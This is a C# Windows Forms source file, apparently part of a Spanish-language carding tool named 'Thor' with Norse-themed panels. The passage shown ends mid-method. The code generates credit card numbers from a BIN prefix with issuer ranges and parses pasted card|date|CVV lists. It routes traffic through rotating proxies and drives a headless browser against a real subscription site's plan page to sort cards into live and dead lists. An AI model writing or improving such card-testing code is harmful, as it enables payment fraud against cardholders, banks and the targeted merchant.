using Bogus;

using CefSharp;
using CefSharp.OffScreen;

using FontAwesome.Sharp;

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Asgard
{
    public partial class Thor : Form, IForm
    {
        public new IAesir Owner { get; set; }
        public new IChecker OChecker { get; set; }
        private string Bin { set; get; }
        private string Quatity { set; get; }
        private int UserId { set; get; }
        private string Token { set; get; }
        private int GateId { set; get; }

        List<List<string>> CreditCards { set; get; }
        List<List<string>> LiveCreditCards { set; get; }
        List<List<string>> DieCreditCards { set; get; }
        List<List<string>> Valkyries { set; get; }
        List<List<string>> LiveValkyries { set; get; }

        #region Range Credit Cards
        private static readonly string[] rangeAmex = new[] { "34", "37" };//American Express
        private static readonly string[] rangeCUP = new[] { "62" };//China Union Pay
        private static readonly string[] rangeDCCB = new[] { "300-305" };//Diners Club Carte Blanche
        private static readonly string[] rangeDCI = new[] { "36", "38" };//Diners Club International
        private static readonly string[] rangeDCUSC = new[] { "54", "55" };//Diners Club United States & Canada
        private static readonly string[] rangeDC = new[] { "6011", "622126-622925", "644-649", "65" };//Discover Card
        private static readonly string[] rangeIntP = new[] { "636" };//InterPayment
        private static readonly string[] rangeInsP = new[] { "637-639" };//InstaPayment
        private static readonly string[] rangeJCB = new[] { "3528-3589" };//JCB
        private static readonly string[] rangeM = new[] { "50", "56-58", "6" };//Maestro
        private static readonly string[] rangeMC = new[] { "2221-2720", "51-55" };//Master Card
        private static readonly string[] rangeUATP = new[] { "1" };//UATP
        private static readonly string[] rangeV = new[] { "4" };//Visa
        #endregion

        private string cvvDigits = "###";

        private static ChromiumWebBrowser browser;

        private const string initialUrl = "https://www.gaia.com/plan-selection/plans";

        private Faker Faker { set; get; }


        private bool IconButtonGenerarClick = false;
        private bool ShowPanelValkyrie = false;
        private bool IconButtonValkyrieVerifyClick = false;
        private bool IconButtonGenerarStopClick = false;
        private Color IconButtonGenerarIconColor;
        private bool IconButtonGenerarEnabled;
        private bool forsetiError = false;

        private CancellationTokenSource tokenCancel;
        private bool requiredValkyrie = false;

        SoundPlayer Valhalla;
        SoundPlayer Valkyrie;

        private bool firstTime;
        private string firstName;
        private string lastName;

        private double OriginalCreditCardsCount;


        public Thor()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
            Faker = new Faker();
        }
        private void Thor_Load(object sender, EventArgs e)
        {
            ControlsInit();
        }

        public void InitializeParameters(params object[] parameters)
        {
            if (parameters.Length == 4)
            {
                UserId = (int)parameters[0];
                Token = parameters[1].ToString();
                Owner = (Aesir)parameters[2];
                OChecker = (Checker)parameters[3];
            }
        }

        #region General
        #region Controls Events
        private void IconButtonBack_Click(object sender, EventArgs e)
        {
            Form form = Parent.Controls.OfType<Aesir>().FirstOrDefault();
            if (form == null)
            {
                Parent.Parent.Show();
                Parent.Parent.BringToFront();
                form.TopLevel = false;
                form.Dock = DockStyle.Fill;
                Parent.Parent.Controls.Add(form);
                Parent.Parent.Tag = form;
                form.BringToFront();
                form.Show();
            }
            else
            {
                form.BringToFront();
            }
        }
        private async void IconButtonClose_Click(object sender, EventArgs e)
        {
            PanelConfirm.Show();
            await IconButtonConfirm.OnClickAsync();
            Owner.HideIconActive("thor");
            PanelConfirm.Hide();
            if (browser != null)
            {
                await browser.Kill("www.gaia.com");
            }
            this.Close();
        }
        #endregion
        #region Methods
        private void ControlsInit()
        {
            Yggdrasil.God = "thor";
            GateId = 3;
            Bin = string.Empty;
            TextBoxBin.ContextMenuStrip = new ContextMenuStrip();
            TextBoxBin.Placeholder("######xxxxxxxxxx");
            MaskedTextBoxDate.ContextMenuStrip = new ContextMenuStrip();
            MaskedTextBoxDate.Placeholder("dd/aa");
            TextBoxCvv.ContextMenuStrip = new ContextMenuStrip();
            TextBoxCvv.Placeholder(cvvDigits);
            TextBoxCvv.MaxLength = 3;
            TextBoxQuantity.ContextMenuStrip = new ContextMenuStrip();

            IconButtonGenerar.IconColor = Color.Black;
            IconButtonGenerar.Enabled = false;
            IconButtonGenerarStop.Hide();
            IconButtonVerify.IconColor = Color.Black;
            IconButtonVerify.Enabled = false;
            IconButtonStop.IconColor = Color.Black;
            IconButtonStop.Enabled = false; ;
            IconButtonClear.IconColor = Color.Black;
            IconButtonClear.Enabled = false;
            IconButtonValkyrieClear.IconColor = Color.Black;
            IconButtonValkyrieClear.Enabled = false;
            IconButtonValkyrieStart.IconColor = Color.Black;
            IconButtonValkyrieStart.Enabled = false;
            IconButtonValkyrieVerify.IconColor = Color.Black;
            IconButtonValkyrieVerify.Enabled = false;
            IconButtonValkyrieStop.Hide();
            CircularProgressBarGeneral.Minimum = 0;
            CircularProgressBarGeneral.Maximum = 100;
            pictureBox1.Hide();
            pictureBox2.Hide();
            pictureBox3.Hide();
            pictureBox4.Hide();
            pictureBox5.Hide();
            pictureBox6.Hide();
            PanelValkyrie.Hide();
            PanelValkyrieLive.Hide();
            PanelValkyrieDie.Hide();
            PanelConfirm.Hide();
            PanelBlockGate.Hide();
            CircularProgressBarGeneral.Value = 0;
            CircularProgressBarDetail.Value = 0;
            Valhalla = new SoundPlayer(@"Valhalla.wav");
            Valkyrie = new SoundPlayer(@"Valkyrie.wav");
        }
        #endregion
        #endregion

        #region Checker
        #region Panel Generator
        #region Panel Events
        private void PanelGenerator_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxBin = new Rectangle(TextBoxBin.Location.X, TextBoxBin.Location.Y, TextBoxBin.ClientSize.Width, TextBoxBin.ClientSize.Height);
            borderTextBoxBin.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxBin, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderMaskedTextBoxDate = new Rectangle(MaskedTextBoxDate.Location.X, MaskedTextBoxDate.Location.Y, MaskedTextBoxDate.ClientSize.Width, MaskedTextBoxDate.ClientSize.Height);
            borderMaskedTextBoxDate.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderMaskedTextBoxDate, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderTextBoxCvv = new Rectangle(TextBoxCvv.Location.X, TextBoxCvv.Location.Y, TextBoxCvv.ClientSize.Width, TextBoxCvv.ClientSize.Height);
            borderTextBoxCvv.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCvv, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderTextBoxQuantity = new Rectangle(TextBoxQuantity.Location.X, TextBoxQuantity.Location.Y, TextBoxQuantity.ClientSize.Width, TextBoxQuantity.ClientSize.Height);
            borderTextBoxQuantity.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxQuantity, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion

        #region Controls Events
        #region TextBoxBin Events
        private void TextBoxBin_Enter(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder("######xxxxxxxxxx");
        }
        private void TextBoxBin_Leave(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder("######xxxxxxxxxx");
            Bin = textBox.Text;
            CompleteBin(textBox);
        }
        private void TextBoxBin_KeyUp(object sender, KeyEventArgs e)
        {
            try
            {
                if (Bin == string.Empty && (e.KeyCode == Keys.D0 || e.KeyCode == Keys.NumPad0))
                {
                    e.SuppressKeyPress = true;
                    return;
                }
            }
            catch (Exception) { }
        }
        private void TextBoxBin_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (Bin == string.Empty && (e.KeyCode == Keys.D0 || e.KeyCode == Keys.NumPad0))
                {
                    e.SuppressKeyPress = true;
                    return;
                }

                if (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
                {
                    Bin += (char)e.KeyValue;
                }
                else if (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.NumPad9)
                {
                    Bin += Convert.ToChar(e.KeyCode - 48);
                }
                else if (e.KeyCode == Keys.Back)
                {
                    int startIndex = Bin.Length - 1;
                    if (startIndex >= 0)
                    {
                        Bin = Bin.Remove(startIndex);
                        Task.Run(() => InfoBinList());
                    }
                    else
                    {
                        e.SuppressKeyPress = true;
                        return;
                    }
                }
                else if (e.KeyCode == Keys.Tab && Bin.Length < 6)
                {
                    e.SuppressKeyPress = true;
                    return;
                }
                else if (e.KeyCode == Keys.V && e.Control)
                {
                    e.SuppressKeyPress = false;
                }
                else
                {
                    e.SuppressKeyPress = true;
                    return;
                }
                Task.Run(() => InfoBinList(Bin));
            }
            catch (Exception) { }
        }
        private void TextBoxBin_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            Bin = textBox.Text;
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                int textLenght = textBox.TextLength;
                for (int i = 0; i < textLenght; i++)
                {
                    if (i < 6)
                    {
                        if (Regex.IsMatch(textBox.Text.Substring(i, 1), "[^0-9]"))
                        {
                            textBox.Clear();
                            break;
                        }
                    }
                    else if (Regex.IsMatch(textBox.Text.Substring(i, 1), @"[^x-xX-X0-9]"))
                    {
                        textBox.Clear();
                        break;
                    }
                }
                CompleteBin(textBox);
                Bin = textBox.Text;
                Task.Run(() => InfoBinList(Bin));
            }
        }
        private void TextBoxBin_Validating(object sender, CancelEventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            string text = textBox.Text;
            if (text == "######xxxxxxxxxx")
            {
                text = string.Empty;
            }

            if (string.IsNullOrEmpty(text))
            {
                IconButtonGenerar.IconColor = Color.Black;
                IconButtonGenerar.Enabled = false;
            }
            else
            {
                if (text.Length < 6)
                {
                    IconButtonGenerar.IconColor = Color.Black;
                    IconButtonGenerar.Enabled = false;
                }
                else
                {
                    if (!ValidateBin(text))
                    {
                        IconButtonGenerar.IconColor = Color.Black;
                        IconButtonGenerar.Enabled = false;
                    }
                    else
                    {
                        IconButtonGenerar.IconColor = Color.Black;
                        IconButtonGenerar.Enabled = true;
                        IconButtonClear.IconColor = Color.Black;
                        IconButtonClear.Enabled = true;

                    }
                }
            }
        }
        #endregion
        #region MaskedBoxDate Events
        private void MaskedTextBoxDate_Enter(object sender, EventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            maskedTextBox.Placeholder("dd/aa");
            MaskedTextBoxDate.Mask = "##/##";
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            this.BeginInvoke((MethodInvoker)delegate ()
            {
                if (text.Length > 2)
                {
                    maskedTextBox.Select(text.Length + 1, 0);
                }
                else
                {
                    maskedTextBox.Select(text.Length, 0);
                }
            });
        }
        private void MaskedTextBoxDate_Leave(object sender, EventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            if (string.IsNullOrEmpty(text) || text.Length < 4)
            {
                maskedTextBox.Clear();
                MaskedTextBoxDate.Mask = "";
                maskedTextBox.Placeholder("dd/aa");
                maskedTextBox.Select(0, 0);
            }

        }
        private void MaskedTextBoxDate_KeyUp(object sender, KeyEventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            if (text.Length > 0)
            {
                if (text.Length == 1)
                {
                    if (Regex.IsMatch(text, @"([^0-1])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 2)
                {
                    if (Regex.IsMatch(text, @"^(0[^1-9]|1[^0-2])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 3)
                {
                    if (Regex.IsMatch(text, @"([^2-2])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 4)
                {
                    if (Regex.IsMatch(text, @"([^0-9])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
            }
        }
        private void MaskedTextBoxDate_TextChanged(object sender, EventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
                string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
                if (text.Length > 0)
                {
                    for (int i = 0; i < text.Length; i++)
                    {
                        if (i == 0)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^0-1])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 1)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"^(0[^1-9]|1[^0-2])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 2)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^2-2])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 3)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^0-9])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                    }
                }
            }
        }
        #endregion
        #region TxtBoxCvv Events
        private void TextBoxCvv_Enter(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder(cvvDigits);
        }
        private void TextBoxCvv_Leave(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (textBox.TextLength < cvvDigits.Length)
            {
                textBox.Clear();
            }
            textBox.Placeholder(cvvDigits);
        }
        private void TextBoxCvv_KeyUp(object sender, KeyEventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (Regex.IsMatch(textBox.Text, "[^0-9]"))
            {
                textBox.Text = textBox.Text.Remove(textBox.TextLength - 1);
            }
        }
        private void TextBoxCvv_TextChanged(object sender, EventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                TextBox textBox = (TextBox)sender;
                if (Regex.IsMatch(textBox.Text, "[^0-9]"))
                {
                    textBox.Clear();
                    textBox.Select(0, 0);
                }
            }
        }
        #endregion
        #region TextBoxQuantity Events
        private void TextBoxQuatity_TextChanged(object sender, EventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                TextBox textBox = (TextBox)sender;
                if (Regex.IsMatch(textBox.Text, "[^0-9]"))
                {
                    textBox.Clear();
                    textBox.Select(0, 0);
                }
            }
        }
        private void TextBoxQuatity_KeyUp(object sender, KeyEventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (Regex.IsMatch(textBox.Text, "[^0-9]"))
            {
                textBox.Text = textBox.Text.Remove(textBox.TextLength - 1);
            }
        }
        private void TextBoxQuatity_Leave(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (textBox.Text == string.Empty)
            {
                textBox.Text = "10";
            }
        }
        #endregion
        #region IconButtonGenerar Events
        private async void IconButtonGenerar_Click(object sender, EventArgs e)
        {
            try
            {
                if (ValidateChildren(ValidationConstraints.Enabled))
                {
                    IconButton iconButton = (IconButton)sender;
                    iconButton.IconColor = Color.Black;
                    iconButton.Enabled = false;
                    IconButtonVerify.IconColor = Color.Black;
                    IconButtonVerify.Enabled = false;
                    IconButtonStop.IconColor = Color.Black;
                    IconButtonStop.Enabled = false;
                    IconButtonClear.IconColor = Color.Black;
                    IconButtonClear.Enabled = false;
                    IconButtonValkyrie.IconColor = Color.Black;
                    IconButtonValkyrie.Enabled = false;
                    IconButtonGenerarStop.Show();
                    IconButtonGenerarClick = true;
                    await ConsoleProgressGeneral("Iniciando Motor del Generador.", 0);
                    await GenerateCreditCards();
                    await ConsoleProgressGeneral("Tarjetas generadas correctamente.", 100, "Success");
                    await ConsoleProgressGeneral("THOR DIOS DEL TRUENO.", 0);
                    IconButtonGenerarStop.Hide();
                    iconButton.IconColor = Color.Black;
                    iconButton.Enabled = true;
                    IconButtonVerify.IconColor = Color.Black;
                    IconButtonVerify.Enabled = true;
                    IconButtonClear.IconColor = Color.Black;
                    IconButtonClear.Enabled = true;
                    IconButtonValkyrie.IconColor = Color.Black;
                    IconButtonValkyrie.Enabled = true;
                    IconButtonGenerarClick = false;
                }
            }
            catch (Exception) { }
        }
        #endregion
        #region IconButtonGenerarStop Events
        private void IconButtonGenerarStop_Click(object sender, EventArgs e)
        {
            if (tokenCancel != null)
            {
                IconButton iconbutton = (IconButton)sender;
                iconbutton.IconColor = Color.Black;
                iconbutton.Enabled = false;
                IconButtonGenerarStopClick = true;
                tokenCancel.Cancel();
                tokenCancel.Dispose();
                tokenCancel = null;
                //IconButtonGenerar.IconColor = Color.Black;
                //IconButtonGenerar.Enabled = true;
                //if(CreditCards != null)
                //{
                //    if(CreditCards.Count > 0)
                //    {
                //        IconButtonVerify.IconColor = Color.Black;
                //        IconButtonVerify.Enabled = true;
                //    }
                //}
            }
        }
        #endregion
        #endregion

        #region Validations
        private bool ValidateBin(string text)
        {
            try
            {
                RangeAndLength[] range = AllCards();
                int rangeLength = range.Length;
                for (int j = 0; j < rangeLength; j++)
                {
                    string pattern = @"\b" + range[j].Range;
                    Match match = Regex.Match(text, pattern);
                    if (match.Success)
                    {
                        return true;
                    }
                }
                return false;
            }
            catch (Exception) { }
            return false;
        }

        #endregion

        #region Methods
        private void CompleteBin(TextBox textBox)
        {
            if (textBox.TextLength >= 6)
            {

                int textLenght = textBox.TextLength;
                int cardLenght = 0;
                Dictionary<int, int> precision = new Dictionary<int, int>();
                RangeAndLength[] range = AllCards();
                int rangeLength = range.Length;
                for (int j = 0; j < rangeLength; j++)
                {
                    string pattern = @"\b" + range[j].Range;
                    Match match = Regex.Match(textBox.Text, pattern);
                    if (match.Success)
                    {
                        precision.Add(j, int.Parse(match.Value));
                    }
                }

                if (precision.Count > 0)
                {
                    RangeAndLength card = range[precision.OrderByDescending(x => x.Value).First().Key];
                    cardLenght = card.Length;
                    textBox.MaxLength = cardLenght;

                    if (card.Range == "34" || card.Range == "37")
                    {
                        cvvDigits = "####";
                        TextBoxCvv.MaxLength = 4;
                    }
                    else
                    {
                        cvvDigits = "###";
                        TextBoxCvv.MaxLength = 3;
                    }

                    if (textLenght >= 6 && textLenght < cardLenght)
                    {
                        int limit = cardLenght - textLenght;
                        string ext = "";
                        for (int i = 0; i < limit; i++)
                        {
                            ext += "x";
                        }
                        textBox.Text += ext;
                    }
                }
                else
                {
                    cvvDigits = "###";
                    TextBoxCvv.MaxLength = 3;
                }

                textBox.Select(textBox.TextLength, 0);
                TextBoxCvv.ForeColor = Color.Silver;
                TextBoxCvv.Text = cvvDigits;
            }
        }
        #endregion
        #endregion
        #region Panel Console
        #region Methods
        public async Task ConsoleProgressGeneral(string info, int value = 101, string status = null)
        {
            try
            {
                LabelInfoGeneralConsole.ForeColor = Color.White;
                int delay = 100;
                if (status == "Success")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.FromArgb(17, 97, 238);
                    delay = 3000;
                }
                else if (status == "Fail")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.FromArgb(227, 184, 20);
                    delay = 5000;
                }

                if (value != 101)
                {
                    CircularProgressBarGeneral.Value = value;
                    CircularProgressBarGeneral.Text = CircularProgressBarGeneral.Value.ToString();
                }
                await Task.Delay(100);
                LabelInfoGeneralConsole.Text = info;
                await Task.Delay(delay);
            }
            catch (Exception) {/* throw;*/ }
        }

        public async Task ConsoleProgressDetail(string info, int value = 101, string status = null)
        {
            try
            {
                LabelInfoGeneralConsole.ForeColor = Color.White;
                int delay = 10;
                if (status == "Success")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.FromArgb(17, 97, 238);
                    delay = 3000;
                }
                else if (status == "Fail")
                {
                    LabelInfoGeneralConsole.ForeColor = Color.DarkRed;
                    delay = 5000;
                }

                if (value != 101)
                {
                    CircularProgressBarDetail.Value = value;
                    CircularProgressBarDetail.Text = CircularProgressBarDetail.Value.ToString();
                }
                await Task.Delay(100);

                LabelInfoGeneralConsole.Text = info;
                await Task.Delay(delay);
            }
            catch (Exception) {/* throw;*/ }
        }
        #endregion
        #endregion
        #region Panel Information
        #region Cotrols Events
        private async void IconButtonValkyrie_Click(object sender, EventArgs e)
        {
            if (ShowPanelValkyrie)
            {
                IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
                IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
                PanelValkyrie.Hide();
                PanelValkyrieLive.Hide();
                PanelValkyrieDie.Hide();
                ShowPanelValkyrie = false;
                await ConsoleProgressGeneral("THOR DIOS DEL TRUENO .", 0);
                await ConsoleProgressDetail("THOR DIOS DEL TRUENO .", 0);
            }
            else
            {
                IconButtonGenerarIconColor = IconButtonGenerar.IconColor;
                IconButtonGenerarEnabled = IconButtonGenerar.Enabled;

                if (IconButtonGenerarEnabled)
                {
                    IconButtonGenerar.IconColor = Color.Black;
                    IconButtonGenerar.Enabled = false;
                }
                PanelValkyrie.Show();
                PanelValkyrieLive.Show();
                PanelValkyrieDie.Show();
                ShowPanelValkyrie = true;
                await ConsoleProgressGeneral("VALQUIRIAS (PROXYS)", 0);
                await ConsoleProgressDetail("VALQUIRIAS (PROXYS)", 0);
            }
        }
        #endregion
        #region Methods
        private async Task InfoBinList(string bin = null)
        {
            try
            {
                if (bin != null)
                {
                    if (bin.Length >= 8)
                    {
                        bin = bin.Substring(0, 8);

                        pictureBox1.Show();
                        pictureBox2.Show();
                        pictureBox3.Show();
                        pictureBox4.Show();
                        pictureBox5.Show();
                        pictureBox6.Show();

                        dynamic binList = await Asatru.InfoBin(bin);
                        if (binList != null)
                        {
                            pictureBox1.Hide();
                            pictureBox2.Hide();
                            pictureBox3.Hide();
                            pictureBox4.Hide();
                            pictureBox5.Hide();
                            pictureBox6.Hide();
                            LabelGetBin.Text = bin;
                            LabelGetSchema.Text = binList.scheme ?? "-";
                            LabelGetType.Text = binList.type ?? "-";
                            LabelGetBrand.Text = binList.brand ?? "-";
                            LabelGetBank.Text = binList.bank.name ?? "-";
                            LabelGetCountry.Text = binList.country.name ?? "-";
                        }
                        else
                        {
                            pictureBox1.Hide();
                            pictureBox2.Hide();
                            pictureBox3.Hide();
                            pictureBox4.Hide();
                            pictureBox5.Hide();
                            pictureBox6.Hide();
                            LabelGetBin.Text = bin;
                            LabelGetSchema.Text = "-";
                            LabelGetType.Text = "-";
                            LabelGetBrand.Text = "-";
                            LabelGetBank.Text = "-";
                            LabelGetCountry.Text = "-";
                        }
                    }
                    else
                    {
                        pictureBox1.Hide();
                        pictureBox2.Hide();
                        pictureBox3.Hide();
                        pictureBox4.Hide();
                        pictureBox5.Hide();
                        pictureBox6.Hide();
                        LabelGetBin.Text = bin;
                        LabelGetSchema.Text = "-";
                        LabelGetType.Text = "-";
                        LabelGetBrand.Text = "-";
                        LabelGetBank.Text = "-";
                        LabelGetCountry.Text = "-";
                    }
                }
            }
            catch (Exception) { }
        }
        #endregion
        #endregion
        #region Panel Credit Cards
        #region Panel Events
        private void PanelCreditCards_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxCreditCards = new Rectangle(TextBoxCreditCards.Location.X, TextBoxCreditCards.Location.Y, TextBoxCreditCards.ClientSize.Width + 17, TextBoxCreditCards.ClientSize.Height);
            borderTextBoxCreditCards.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCreditCards, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Controls Events
        private void TextBoxCreditCards_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            try
            {
                LabelCountCreditCards.Text = textBox.Lines.Count().ToString();
                string creditCards = textBox.Text.Trim();
                if (ModifierKeys.HasFlag(Keys.Control))
                {
                    if (creditCards.Contains("\r\n"))
                    {
                        string[] listCreditCards = creditCards.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                        int listcreditCardsLength = listCreditCards.Length;
                        CreditCards = new List<List<string>>();
                        for (int i = 0; i < listcreditCardsLength; i++)
                        {
                            string[] listCreditCard = listCreditCards[i].Split('|');
                            CreditCards.Add(new List<string>());
                            CreditCards[i].Add(listCreditCard[0]);
                            CreditCards[i].Add(listCreditCard[1]);
                            CreditCards[i].Add(listCreditCard[2]);
                            CreditCards[i].Add(listCreditCard[3]);
                        }
                        if (!IconButtonGenerarClick)
                        {
                            IconButtonVerify.IconColor = Color.Black;
                            IconButtonVerify.Enabled = true;
                            IconButtonClear.IconColor = Color.Black;
                            IconButtonClear.Enabled = true;
                        }

                        //TextBoxBin.Clear();
                        //TextBoxBin.Placeholder("######xxxxxxxxxx");
                        //MaskedTextBoxDate.Clear();
                        //MaskedTextBoxDate.Placeholder("dd/aa");
                        //TextBoxCvv.Clear();
                        //TextBoxCvv.Placeholder(cvvDigits);
                        //TextBoxQuantity.Clear();
                        //TextBoxQuantity.Text = "10";
                        Task.Run(() => InfoBinList(CreditCards[0][0]));
                    }
                    else if (creditCards.Contains("|"))
                    {
                        CreditCards = new List<List<string>>();
                        string[] listCreditCard = creditCards.Split('|');
                        CreditCards.Add(new List<string>());
                        CreditCards[0].Add(listCreditCard[0]);
                        CreditCards[0].Add(listCreditCard[1]);
                        CreditCards[0].Add(listCreditCard[2]);
                        CreditCards[0].Add(listCreditCard[3]);
                        if (!IconButtonGenerarClick)
                        {
                            IconButtonVerify.IconColor = Color.Black;
                            IconButtonVerify.Enabled = true;
                            IconButtonClear.IconColor = Color.Black;
                            IconButtonClear.Enabled = true;
                        }
                        //TextBoxBin.Clear();
                        //TextBoxBin.Placeholder("######xxxxxxxxxx");
                        //MaskedTextBoxDate.Clear();
                        //MaskedTextBoxDate.Placeholder("dd/aa");
                        //TextBoxCvv.Clear();
                        //TextBoxCvv.Placeholder(cvvDigits);
                        //TextBoxQuantity.Clear();
                        //TextBoxQuantity.Text = "10";
                        Task.Run(() => InfoBinList(CreditCards[0][0]));
                    }
                    else
                    {
                        textBox.Text = string.Empty;
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = false;
                        IconButtonClear.IconColor = Color.Black;
                        IconButtonClear.Enabled = false;
                    }
                }
                else
                {
                    if (creditCards == string.Empty)
                    {
                        textBox.Text = string.Empty;
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = false;
                        if (TextBoxValhalla.Text == string.Empty && TextBoxHelheim.Text == string.Empty && IconButtonGenerar.Enabled == false)
                        {
                            IconButtonClear.IconColor = Color.Black;
                            IconButtonClear.Enabled = false;
                        }
                    }
                }
            }
            catch (Exception)
            {
                textBox.Text = string.Empty;
                IconButtonVerify.IconColor = Color.Black;
                IconButtonVerify.Enabled = false;
                IconButtonClear.IconColor = Color.Black;
                IconButtonClear.Enabled = false;
            }
        }
        private async void IconButtonVerify_Click(object sender, EventArgs e)
        {
            try
            {
                IconButtonGenerarIconColor = IconButtonGenerar.IconColor;
                IconButtonGenerarEnabled = IconButtonGenerar.Enabled;
                IconButton iconButton = (IconButton)sender;
                iconButton.IconColor = Color.Black;
                iconButton.Enabled = false;
                IconButtonGenerar.IconColor = Color.Black;
                IconButtonGenerar.Enabled = false;
                IconButtonClear.IconColor = Color.Black;
                IconButtonClear.Enabled = false;
                IconButtonValkyrie.IconColor = Color.Black;
                IconButtonValkyrie.Enabled = false;
                IconButtonStop.IconColor = Color.Black;
                IconButtonStop.Enabled = true;
                OriginalCreditCardsCount = CreditCards.Count;
                await InvokeThor();
                IconButtonClear.IconColor = Color.Black;
                IconButtonClear.Enabled = true;
                IconButtonValkyrie.IconColor = Color.Black;
                IconButtonValkyrie.Enabled = true;
            }
            catch (Exception) { }
        }
        #endregion
        #endregion
        #region Panel Valhalla
        #region Panel Events
        private void PanelValhalla_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValhalla = new Rectangle(TextBoxValhalla.Location.X, TextBoxValhalla.Location.Y, TextBoxValhalla.ClientSize.Width + 17, TextBoxValhalla.ClientSize.Height);
            borderTextBoxValhalla.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValhalla, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Contols Events
        private void TextBoxValhalla_TextChanged(object sender, EventArgs e)
        {
            try
            {
                TextBox textBox = (TextBox)sender;
                LabelCountValhalla.Text = textBox.Lines.Count().ToString();
                Valhalla.Play();
            }
            catch (Exception) { }
        }
        private async void IconButtonStop_Click(object sender, EventArgs e)
        {
            try
            {
                IconButton iconButton = (IconButton)sender;
                iconButton.IconColor = Color.Black;
                iconButton.Enabled = false;

                await browser.Kill("www.gaia.com");
                await tokenCancel.Kill();

                await ConsoleProgressGeneral("Thor esta siendo Detenido.", 0, "Success");
                await ConsoleProgressDetail("Thor esta siendo Detenido.", 0, "Success");
                await ConsoleProgressGeneral("THOR DIOS DEL TRUENO .", 0);
                await ConsoleProgressDetail("THOR DIOS DEL TRUENO .", 0);
                IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
                IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
                IconButtonClear.IconColor = Color.Black;
                IconButtonClear.Enabled = true;
                IconButtonValkyrie.IconColor = Color.Black;
                IconButtonValkyrie.Enabled = true;
                if (CreditCards != null)
                {
                    if (CreditCards.Count > 0)
                    {
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = true;

                    }
                    else
                    {
                        TextBoxCreditCards.Clear();
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = false;
                    }
                }
            }
            catch (Exception) { }
        }
        #endregion
        #endregion
        #region Panel Hellheim
        #region Panel Events
        private void PanelHellheim_Paint(object sender, PaintEventArgs e)
        {
